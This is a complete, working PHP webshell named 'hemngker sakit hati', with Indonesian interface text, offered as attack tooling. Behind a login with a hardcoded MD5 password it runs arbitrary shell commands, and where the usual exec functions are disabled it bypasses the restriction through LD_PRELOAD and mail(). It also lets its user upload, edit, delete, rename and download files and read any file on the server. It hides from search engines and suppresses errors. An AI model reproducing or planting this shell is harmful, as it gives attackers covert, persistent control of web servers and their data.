<?php
/*
    Webshell: hemngker sakit hati
    Author: hemngker
    Version: 1.0
    Untuk testing localhost
*/

// ====================== KONFIGURASI ======================
$GLOBALS['config'] = array(
    'username' => 'hemngker9292929292',
    'password' => 'e10adc3949ba59abbe56e057f20f883e', // MD5("123456")
    'safe_mode' => '0',
    'login_page' => '403',
    'show_icons' => '1',
);

// ====================== FUNGSI DASAR ======================
function hemngker_hash($str) {
    return md5($str);
}

function hemngker_is_logged_in() {
    return isset($_COOKIE['hemngker_user']) && 
           $_COOKIE['hemngker_user'] === $GLOBALS['config']['username'] &&
           isset($_COOKIE['hemngker_pass']) && 
           $_COOKIE['hemngker_pass'] === hemngker_hash($GLOBALS['config']['password']);
}

function hemngker_set_cookie($key, $value) {
    setcookie($key, $value, time() + (86400 * 7), '/');
    $_COOKIE[$key] = $value;
}

function hemngker_show_login() {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="robots" content="noindex,nofollow">
        <title>hemngker sakit hati</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: #0a0a0a;
                font-family: 'Courier New', monospace;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                margin: 0;
                overflow: hidden;
            }
            .bg-text {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: 0;
                color: rgba(255, 0, 0, 0.03);
                font-size: 60px;
                font-weight: bold;
                letter-spacing: 30px;
                text-align: center;
                line-height: 100vh;
                user-select: none;
                pointer-events: none;
            }
            .login-box {
                position: relative;
                z-index: 1;
                background: rgba(10, 10, 10, 0.95);
                padding: 50px 40px 40px;
                border-radius: 12px;
                border: 2px solid #ff2222;
                box-shadow: 0 0 50px rgba(255, 0, 0, 0.2);
                width: 380px;
                text-align: center;
            }
            .login-box h1 {
                color: #ff2222;
                font-size: 22px;
                letter-spacing: 3px;
                margin-bottom: 8px;
                text-transform: uppercase;
                font-weight: 300;
            }
            .login-box .sub {
                color: #ff4444;
                font-size: 14px;
                margin-bottom: 30px;
                opacity: 0.7;
                font-weight: 300;
            }
            .login-box .glitch {
                color: #ff2222;
                font-size: 45px;
                letter-spacing: 5px;
                margin-bottom: 5px;
                font-weight: bold;
                animation: glitch 1.8s infinite;
            }
            @keyframes glitch {
                0%, 90%, 100% { text-shadow: 2px 0 #ff0000, -2px 0 #00ff00; }
                92% { text-shadow: 8px 0 #ff0000, -8px 0 #00ff00; }
                94% { text-shadow: -8px 0 #ff0000, 8px 0 #00ff00; }
                96% { text-shadow: 4px 0 #ff0000, -4px 0 #00ff00; }
                98% { text-shadow: -4px 0 #ff0000, 4px 0 #00ff00; }
            }
            .login-box .divider {
                width: 60px;
                height: 2px;
                background: #ff2222;
                margin: 10px auto 25px;
                opacity: 0.5;
            }
            .login-box label {
                color: #888;
                font-size: 12px;
                text-transform: uppercase;
                letter-spacing: 2px;
                display: block;
                text-align: left;
                margin-bottom: 4px;
            }
            .login-box input[type="text"],
            .login-box input[type="password"] {
                width: 100%;
                padding: 12px 15px;
                margin-bottom: 18px;
                background: #1a1a1a;
                border: 1px solid #333;
                border-radius: 4px;
                color: #fff;
                font-size: 15px;
                transition: border-color 0.3s, box-shadow 0.3s;
            }
            .login-box input:focus {
                outline: none;
                border-color: #ff2222;
                box-shadow: 0 0 20px rgba(255, 0, 0, 0.15);
            }
            .login-box input[type="submit"] {
                width: 100%;
                padding: 14px;
                background: #ff2222;
                border: none;
                border-radius: 4px;
                color: #fff;
                font-size: 15px;
                letter-spacing: 3px;
                cursor: pointer;
                transition: background 0.3s, transform 0.2s;
                text-transform: uppercase;
                font-weight: bold;
            }
            .login-box input[type="submit"]:hover {
                background: #cc0000;
                transform: scale(1.01);
            }
            .login-box .error {
                color: #ff4444;
                font-size: 13px;
                margin-top: 15px;
                animation: fadeError 3s ease-in-out;
            }
            @keyframes fadeError {
                0% { opacity: 0; transform: translateY(-5px); }
                15% { opacity: 1; transform: translateY(0); }
                85% { opacity: 1; }
                100% { opacity: 0; }
            }
            .login-box .footer {
                color: #333;
                font-size: 11px;
                margin-top: 25px;
                letter-spacing: 1px;
            }
            .login-box .footer a {
                color: #ff4444;
                text-decoration: none;
                opacity: 0.5;
                transition: opacity 0.3s;
            }
            .login-box .footer a:hover {
                opacity: 1;
            }
            .blood {
                position: fixed;
                bottom: 0;
                left: 0;
                width: 100%;
                height: 80px;
                background: radial-gradient(ellipse at center, rgba(255,0,0,0.05) 0%, transparent 70%);
                z-index: 0;
                pointer-events: none;
            }
        </style>
    </head>
    <body>
        <div class="bg-text">♥ S A K I T ♥ H A T I ♥</div>
        <div class="blood"></div>
        <div class="login-box">
            <div class="glitch">hemngker</div>
            <h1>sakit hati</h1>
            <div class="sub">— menebas web —</div>
            <div class="divider"></div>
            <form method="POST" action="">
                <label>Username</label>
                <input type="text" name="usrname" placeholder="masukkan username" autofocus>
                <label>Password</label>
                <input type="password" name="password" placeholder="masukkan password">
                <input type="submit" value="→ Masuk ←">
                <?php if (isset($_GET['error'])): ?>
                    <div class="error">❌ Username atau password salah!</div>
                <?php endif; ?>
            </form>
            <div class="footer">
                <a href="javascript:void(0)">hemngker sakit hati</a> &nbsp;·&nbsp; 2026
            </div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// ====================== LOGIN HANDLER ======================
if (isset($_POST['usrname']) && isset($_POST['password'])) {
    $username = $_POST['usrname'];
    $password = $_POST['password'];

    if ($username === $GLOBALS['config']['username'] && 
        hemngker_hash($password) === $GLOBALS['config']['password']) {
        hemngker_set_cookie('hemngker_user', $username);
        hemngker_set_cookie('hemngker_pass', hemngker_hash($GLOBALS['config']['password']));
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        header('Location: ' . $_SERVER['PHP_SELF'] . '?error=1');
        exit;
    }
}

// ====================== CEK LOGIN ======================
if (!hemngker_is_logged_in()) {
    hemngker_show_login();
}

// ====================== HEMNGKER SHELL ======================
@error_reporting(E_ALL ^ E_NOTICE);
@ini_set('display_errors', 0);
@ini_set('max_execution_time', 0);
@set_time_limit(0);
@ignore_user_abort(true);

// === FUNGSI SHELL ===
function hemngker_cwd() {
    if (function_exists('getcwd')) return @getcwd();
    return dirname($_SERVER['SCRIPT_FILENAME']);
}

function hemngker_ex($cmd) {
    $out = '';
    if (function_exists('shell_exec')) {
        $out = @shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('exec')) {
        @exec($cmd . ' 2>&1', $out);
        $out = implode("\n", $out);
    } elseif (function_exists('system')) {
        ob_start();
        @system($cmd . ' 2>&1');
        $out = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($cmd . ' 2>&1');
        $out = ob_get_clean();
    }
    if ($out === '' || $out === null) {
        $of = '/tmp/ht_out.' . $_SERVER['REQUEST_TIME'] . '.txt';
        @putenv('HKG_CMD=' . '{ ' . $cmd . '; } > ' . $of . ' 2>&1');
        @putenv('LD_PRELOAD=/tmp/hook.so');
        @mail('root@localhost', '', 'x');
        @putenv('LD_PRELOAD');
        usleep(700000);
        if (is_file($of) && is_readable($of)) {
            $out = @file_get_contents($of);
            @unlink($of);
        } else {
            $out = '[no-exec]';
        }
    }
    return $out;
}

function hemngker_read_file($file) {
    if (function_exists('file_get_contents')) {
        return @file_get_contents($file);
    }
    $content = '';
    if ($fh = @fopen($file, 'rb')) {
        while (!feof($fh)) {
            $content .= fread($fh, 8192);
        }
        fclose($fh);
    }
    return $content;
}

function hemngker_write_file($file, $content) {
    if ($fh = @fopen($file, 'wb')) {
        fwrite($fh, $content);
        fclose($fh);
        return true;
    }
    return false;
}

function hemngker_size($s) {
    if ($s >= 1073741824) return sprintf('%1.2f', $s / 1073741824) . ' GB';
    if ($s >= 1048576) return sprintf('%1.2f', $s / 1048576) . ' MB';
    if ($s >= 1024) return sprintf('%1.2f', $s / 1024) . ' KB';
    return $s . ' B';
}

$cwd = isset($_POST['cwd']) ? $_POST['cwd'] : (isset($_GET['cwd']) ? $_GET['cwd'] : (isset($_GET['n']) ? $_GET['n'] : hemngker_cwd()));
if (!is_dir($cwd)) $cwd = hemngker_cwd();
if (substr($cwd, -1) != '/') $cwd .= '/';

// === PROSES ACTION ===
$message = '';
$msg_type = 'info';

if (isset($_POST['action'])) {
    $action = $_POST['action'];
    $target = isset($_POST['target']) ? $_POST['target'] : '';
    $content = isset($_POST['content']) ? $_POST['content'] : '';
    $new_name = isset($_POST['new_name']) ? $_POST['new_name'] : '';

    switch ($action) {
        case 'exec':
            $output = hemngker_ex($target);
            break;

        case 'upload':
            if (isset($_FILES['file']) && $_FILES['file']['error'] == 0) {
                $dest = $cwd . basename($_FILES['file']['name']);
                if (move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
                    $message = '✅ Upload berhasil: ' . basename($_FILES['file']['name']);
                    $msg_type = 'success';
                } else {
                    $message = '❌ Upload gagal!';
                    $msg_type = 'error';
                }
            }
            break;

        case 'mkfile':
            $path = $cwd . $target;
            if (hemngker_write_file($path, $content)) {
                $message = '✅ File dibuat: ' . $target;
                $msg_type = 'success';
            } else {
                $message = '❌ Gagal membuat file!';
                $msg_type = 'error';
            }
            break;

        case 'mkdir':
            $path = $cwd . $target;
            if (@mkdir($path, 0755, true)) {
                $message = '✅ Folder dibuat: ' . $target;
                $msg_type = 'success';
            } else {
                $message = '❌ Gagal membuat folder!';
                $msg_type = 'error';
            }
            break;

        case 'delete':
            $path = $cwd . $target;
            if (is_file($path)) {
                if (@unlink($path)) {
                    $message = '✅ File dihapus: ' . $target;
                    $msg_type = 'success';
                } else {
                    $message = '❌ Gagal menghapus file!';
                    $msg_type = 'error';
                }
            } elseif (is_dir($path)) {
                $files = array_diff(scandir($path), array('.', '..'));
                foreach ($files as $f) {
                    is_dir($path . '/' . $f) ? @rmdir($path . '/' . $f) : @unlink($path . '/' . $f);
                }
                if (@rmdir($path)) {
                    $message = '✅ Folder dihapus: ' . $target;
                    $msg_type = 'success';
                } else {
                    $message = '❌ Gagal menghapus folder!';
                    $msg_type = 'error';
                }
            }
            break;

        case 'rename':
            $old = $cwd . $target;
            $new = $cwd . $new_name;
            if (@rename($old, $new)) {
                $message = '✅ Rename berhasil: ' . $target . ' → ' . $new_name;
                $msg_type = 'success';
            } else {
                $message = '❌ Rename gagal!';
                $msg_type = 'error';
            }
            break;

        case 'download':
            $path = $cwd . $target;
            if (is_file($path) && is_readable($path)) {
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($path) . '"');
                header('Content-Length: ' . filesize($path));
                readfile($path);
                exit;
            }
            break;
    }
}

// === BACA DIREKTORI ===
$dirs = array();
$files = array();
$scanned = @scandir($cwd);
if ($scanned) {
    foreach ($scanned as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $cwd . $item;
        if (is_dir($path)) {
            $dirs[] = $item;
        } else {
            $files[] = $item;
        }
    }
    sort($dirs);
    sort($files);
}
$items = array_merge($dirs, $files);

// === VIEW SHELL ===
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="robots" content="noindex,nofollow">
<title>hemngker sakit hati — system.php</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    background: #0d0d0d;
    font-family: 'Courier New', monospace;
    color: #c0c0c0;
    padding: 20px;
}
.wrapper {
    max-width: 1200px;
    margin: 0 auto;
    background: #111;
    border-radius: 10px;
    border: 1px solid #2a2a2a;
    padding: 25px;
    box-shadow: 0 0 30px rgba(255,0,0,0.05);
}
.header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    border-bottom: 1px solid #2a2a2a;
    padding-bottom: 15px;
    margin-bottom: 20px;
}
.header h1 {
    color: #ff2222;
    font-size: 20px;
    letter-spacing: 3px;
    font-weight: 300;
}
.header .info {
    color: #555;
    font-size: 13px;
    text-align: right;
}
.header .info span {
    color: #ff4444;
}
.msg {
    padding: 12px 18px;
    border-radius: 4px;
    margin-bottom: 20px;
    font-size: 14px;
    display: <?php echo $message ? 'block' : 'none'; ?>;
}
.msg.success { background: #1a3a1a; border-left: 3px solid #00ff44; color: #88ff88; }
.msg.error { background: #3a1a1a; border-left: 3px solid #ff2222; color: #ff8888; }
.msg.info { background: #1a1a3a; border-left: 3px solid #4488ff; color: #8888ff; }

.toolbar {
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
    margin-bottom: 20px;
    padding: 15px;
    background: #161616;
    border-radius: 6px;
    border: 1px solid #222;
}
.toolbar form { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; }
.toolbar input[type="text"],
.toolbar input[type="file"],
.toolbar select {
    padding: 8px 12px;
    background: #222;
    border: 1px solid #333;
    border-radius: 4px;
    color: #eee;
    font-size: 13px;
    min-width: 100px;
}
.toolbar input[type="text"]:focus {
    border-color: #ff2222;
    outline: none;
}
.toolbar input[type="submit"],
.toolbar button {
    padding: 8px 18px;
    background: #2a2a2a;
    border: 1px solid #444;
    border-radius: 4px;
    color: #ddd;
    cursor: pointer;
    font-size: 13px;
    transition: all 0.3s;
}
.toolbar input[type="submit"]:hover,
.toolbar button:hover {
    background: #ff2222;
    border-color: #ff2222;
    color: #fff;
}
.toolbar .cwd-display {
    color: #66ccff;
    font-size: 14px;
    word-break: break-all;
    flex: 1;
    padding: 8px 12px;
    background: #0a0a0a;
    border-radius: 4px;
}

table {
    width: 100%;
    border-collapse: collapse;
    font-size: 13px;
}
table th {
    text-align: left;
    padding: 10px 12px;
    background: #1a1a1a;
    border-bottom: 2px solid #2a2a2a;
    color: #888;
    font-weight: normal;
    text-transform: uppercase;
    font-size: 11px;
    letter-spacing: 1px;
}
table td {
    padding: 8px 12px;
    border-bottom: 1px solid #1a1a1a;
}
table tr:hover td {
    background: #181818;
}
table .name {
    color: #66ccff;
}
table .name.dir {
    color: #ffaa44;
}
table .name.shell {
    color: #ff2222;
    font-weight: bold;
}
table .size { color: #666; font-size: 12px; }
table .actions a {
    color: #666;
    text-decoration: none;
    margin-right: 8px;
    padding: 2px 6px;
    font-size: 12px;
    transition: color 0.3s;
}
table .actions a:hover {
    color: #fff;
}
table .actions a.del:hover { color: #ff2222; }
table .actions a.dl:hover { color: #44ff88; }
table .actions a.edit:hover { color: #ffaa44; }

textarea {
    width: 100%;
    height: 200px;
    background: #0a0a0a;
    border: 1px solid #222;
    color: #ddd;
    padding: 12px;
    font-family: 'Courier New', monospace;
    font-size: 13px;
    border-radius: 4px;
    margin-top: 10px;
}
textarea:focus {
    border-color: #ff2222;
    outline: none;
}

.footer {
    text-align: center;
    padding-top: 20px;
    margin-top: 20px;
    border-top: 1px solid #1a1a1a;
    color: #333;
    font-size: 12px;
}
.footer a { color: #555; text-decoration: none; }
.footer a:hover { color: #ff4444; }

@media (max-width: 768px) {
    .toolbar form { flex-direction: column; width: 100%; }
    .toolbar input[type="text"] { width: 100%; }
    .wrapper { padding: 15px; }
    table { font-size: 12px; }
    table td, table th { padding: 6px 8px; }
}
</style>
</head>
<body>
<div class="wrapper">
    <div class="header">
        <h1>♥ hemngker sakit hati</h1>
        <div class="info">
            <?php echo htmlspecialchars($cwd); ?><br>
            <span>✦ <?php echo date('Y-m-d H:i:s'); ?></span>
        </div>
    </div>

    <?php if ($message): ?>
    <div class="msg <?php echo $msg_type; ?>"><?php echo $message; ?></div>
    <?php endif; ?>

    <div class="toolbar">
        <div class="cwd-display">📁 <?php echo htmlspecialchars($cwd); ?></div>
    </div>

    <!-- Toolbar -->
    <div class="toolbar" style="flex-wrap: wrap;">
        <form method="POST" style="flex-wrap: wrap;">
            <input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">
            <input type="hidden" name="action" value="exec">
            <input type="text" name="target" placeholder="Perintah (contoh: ls -la)" style="min-width:200px;">
            <input type="submit" value="▶ Jalankan">
        </form>

        <form method="POST" enctype="multipart/form-data" style="flex-wrap: wrap;">
            <input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">
            <input type="hidden" name="action" value="upload">
            <input type="file" name="file">
            <input type="submit" value="⬆ Upload">
        </form>

        <form method="POST" style="flex-wrap: wrap;">
            <input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">
            <input type="hidden" name="action" value="mkfile">
            <input type="text" name="target" placeholder="file.txt" style="min-width:100px;">
            <input type="submit" value="📄 Buat File">
        </form>

        <form method="POST" style="flex-wrap: wrap;">
            <input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">
            <input type="hidden" name="action" value="mkdir">
            <input type="text" name="target" placeholder="folder_baru" style="min-width:100px;">
            <input type="submit" value="📁 Buat Folder">
        </form>
    </div>

    <!-- Output -->
    <?php if (isset($output) && $output !== null): ?>
    <div style="margin-bottom:20px;">
        <div style="color:#888; font-size:12px; margin-bottom:4px;">📤 Output:</div>
        <pre style="background:#0a0a0a; padding:15px; border:1px solid #1a1a1a; border-radius:4px; overflow:auto; max-height:300px; color:#88ff88; font-size:13px;"><?php echo htmlspecialchars($output); ?></pre>
    </div>
    <?php endif; ?>

    <!-- File Manager -->
    <div style="overflow-x:auto;">
    <table>
        <thead>
            <tr>
                <th style="width:50%;">Nama</th>
                <th style="width:20%;">Ukuran</th>
                <th style="width:30%;">Aksi</th>
            </tr>
        </thead>
        <tbody>
            <?php if ($cwd != '/'): ?>
            <tr>
                <td class="name dir"><a href="?cwd=<?php echo urlencode(dirname($cwd)); ?>" style="color:#ffaa44;text-decoration:none;">📁 ..</a></td>
                <td class="size">-</td>
                <td class="actions">-</td>
            </tr>
            <?php endif; ?>

            <?php foreach ($items as $item): 
                $path = $cwd . $item;
                $is_dir = is_dir($path);
                $is_shell = ($item === 'system.php');
                $size = $is_dir ? '📁' : hemngker_size(filesize($path));
                $icon = $is_dir ? '📁' : '📄';
                $name_class = $is_dir ? 'name dir' : 'name';
                if ($is_shell) $name_class .= ' shell';
            ?>
            <tr>
                <td class="<?php echo $name_class; ?>">
                    <?php if ($is_dir): ?>
                        <a href="?cwd=<?php echo urlencode($path); ?>" style="color:#ffaa44;text-decoration:none;"><?php echo $icon . ' ' . htmlspecialchars($item); ?></a>
                    <?php else: ?>
                        <?php echo $icon . ' ' . htmlspecialchars($item); ?>
                    <?php endif; ?>
                </td>
                <td class="size"><?php echo $size; ?></td>
                <td class="actions">
                    <?php if (!$is_dir): ?>
                        <a href="?action=view&file=<?php echo urlencode($path); ?>" class="edit" title="Lihat">👁</a>
                        <a href="?action=edit&file=<?php echo urlencode($path); ?>" class="edit" title="Edit">✏️</a>
                        <form method="POST" style="display:inline;">
                            <input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">
                            <input type="hidden" name="action" value="download">
                            <input type="hidden" name="target" value="<?php echo htmlspecialchars($item); ?>">
                            <button type="submit" style="background:none;border:none;color:#44ff88;cursor:pointer;padding:0;font-size:12px;" title="Download">⬇</button>
                        </form>
                    <?php endif; ?>
                    <form method="POST" style="display:inline;" onsubmit="return confirm('Yakin hapus <?php echo htmlspecialchars($item); ?>?');">
                        <input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">
                        <input type="hidden" name="action" value="delete">
                        <input type="hidden" name="target" value="<?php echo htmlspecialchars($item); ?>">
                        <button type="submit" style="background:none;border:none;color:#ff4444;cursor:pointer;padding:0;font-size:12px;" title="Hapus">🗑</button>
                    </form>
                    <?php if (!$is_dir): ?>
                        <form method="POST" style="display:inline;">
                            <input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">
                            <input type="hidden" name="action" value="rename">
                            <input type="hidden" name="target" value="<?php echo htmlspecialchars($item); ?>">
                            <input type="text" name="new_name" placeholder="nama_baru" style="width:80px;padding:2px 4px;background:#222;border:1px solid #333;color:#ddd;font-size:11px;">
                            <button type="submit" style="background:none;border:none;color:#ffaa44;cursor:pointer;padding:0;font-size:12px;">↻</button>
                        </form>
                    <?php endif; ?>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
    </div>

    <!-- View/Edit -->
    <?php
    if (isset($_GET['action']) && isset($_GET['file'])) {
        $file_path = $_GET['file'];
        if (is_file($file_path) && is_readable($file_path)) {
            $content = hemngker_read_file($file_path);
            if ($_GET['action'] === 'edit') {
                echo '<form method="POST" style="margin-top:20px;">';
                echo '<input type="hidden" name="cwd" value="' . htmlspecialchars(dirname($file_path)) . '/">';
                echo '<input type="hidden" name="action" value="mkfile">';
                echo '<input type="hidden" name="target" value="' . htmlspecialchars(basename($file_path)) . '">';
                echo '<textarea name="content">' . htmlspecialchars($content) . '</textarea>';
                echo '<div style="margin-top:10px;"><input type="submit" value="💾 Simpan" style="padding:8px 20px;background:#2a2a2a;border:1px solid #444;border-radius:4px;color:#ddd;cursor:pointer;"></div>';
                echo '</form>';
            } else {
                echo '<div style="margin-top:20px;">';
                echo '<div style="color:#888;font-size:12px;margin-bottom:4px;">📄 Isi file: ' . htmlspecialchars(basename($file_path)) . '</div>';
                echo '<pre style="background:#0a0a0a;padding:15px;border:1px solid #1a1a1a;border-radius:4px;overflow:auto;max-height:400px;font-size:13px;">' . htmlspecialchars($content) . '</pre>';
                echo '</div>';
            }
        }
    }
    ?>

    <div class="footer">
        <a href="javascript:void(0)">hemngker sakit hati</a> &nbsp;·&nbsp; 
        <a href="javascript:void(0)">menebas web</a> &nbsp;·&nbsp; 
        <?php echo date('Y'); ?>
    </div>
</div>
</body>
</html>
<?php
exit;
?>
